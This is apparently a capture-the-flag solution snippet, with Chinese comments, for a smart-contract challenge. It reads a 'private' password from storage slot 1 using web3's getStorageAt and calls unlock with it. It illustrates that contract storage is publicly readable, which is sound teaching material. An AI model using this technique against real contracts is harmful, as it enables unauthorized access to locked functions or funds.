/*
只需要从合约中读取 password 即可
在目标合约中，password 会存储在插槽 1 中（插槽 0 存储了 locked，占据 1 字节（不是 1 bit) ，剩下的 31 字节不足以存储 32 字节的 password）
*/
let password = await web3.eth.getStorageAt(instance, 1)
contract.unlock(password)
